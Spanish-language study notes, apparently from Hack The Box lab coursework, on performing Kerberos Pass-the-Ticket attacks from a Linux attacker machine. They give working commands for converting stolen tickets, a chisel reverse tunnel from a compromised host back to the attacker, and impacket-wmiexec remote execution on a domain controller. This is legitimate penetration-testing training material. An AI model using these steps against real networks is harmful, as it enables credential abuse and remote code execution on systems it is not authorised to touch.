# Pass the Ticket desde Linux (Atacante Remoto)

## Introduccion
En esta sección se detalla cómo hacer ataques PtT desde una máquina Linux (atacante), sin estar unida a un dominio. Se separa de la nota [[06_Pass_the_ticket_Linux_Victima]] porque en esa nota se explican ataques a una máquina Linux unida al dominio y en este caso se detallarán ataques PtT DESDE una máquina Linux atacante como puede ser un Parrot OS o Kali.

### 1. Conversión de Tickets (Ticket Converter Windows <-> Linux)
Si tenemos un ticket `.kirbi` obtenido de Windows, no podemos usarlo directamente en Linux hasta convertirlo a formato `.ccache` (y viceversa).
https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py

```bash
# Ejemplo convertir un ccache a .kirbi (o kirbi a ccache)
glmbx@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```

---

### 2. Requisitos de Red y Conectividad

##### Resolucion DNS
* Editar nuestro fichero hosts agregando manualmente las maquinas y las ip correspondientes para poder funcionar (Kerberos requiere nombres de host / FQDN y no funcionará contra IPs directas).

```bash
# Tenemos tanto el DC, como las maquinas que nos interesen si tenemos que hacer pivoting o tunneling intermedio
glmbx@htb[/htb]$ cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

##### Conectividad 
* Conectividad con el DC (normalmente es el que tiene Kerberos, que es lo que nos interesa principalmente).

En caso de no tener conectividad pero si tener acceso a una maquina de la red interna que si tenga conectividad deberemos pivotar. Para este caso veremos ejemplo con proxychains y chisel:
##### Proxychains + Chisel
> En este caso tendremos acceso a todas las IP y puertos TCP de la red interna o de lo que tenga acceso nuestra máquina víctima, pero con limitaciones (no UDP, no ICMP, inestabilidad).
> *(Para la metodología detallada de pivoting y tunneling, consultar [[03_Ligolo_Chisel]])*.


Proxychains config file (maquina atacante)
```
glmbx@htb[/htb]$ cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

Chisel en maquina atacante:
```bash
glmbx@htb[/htb]$ sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

Desplegar chisel en nuestra maquina victima (que tiene conectividad con el DC). Puede ser Windows o Linux, no importa.
```bash
# La IP de client es la IP de la maquina atacante
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
```

---

### 3. Cargar el Ticket en la Sesión Atacante
Finalmente necesitamos en el atacante el fichero de ticket y exportar la variable apuntando a dicho fichero:
```bash
glmbx@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

---

### 4. Ejecución Remota (WMI con Impacket)
Teniendo ya conectividad con la maquina objetivo y nuestro ticket importado, se pueden realizar multitud de ataques, enumeraciones, etc. Ejemplo de WMI con impacket:

```bash
glmbx@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
glmbx@htb[/htb]$ proxychains impacket-wmiexec dc01 -k --no-pass
```
> NOTA: Hay que poner el nombre de equipo y no la IP (ejemplo de dc01). Y si nos pide contraseña podemos utilizar el argumento --no-pass



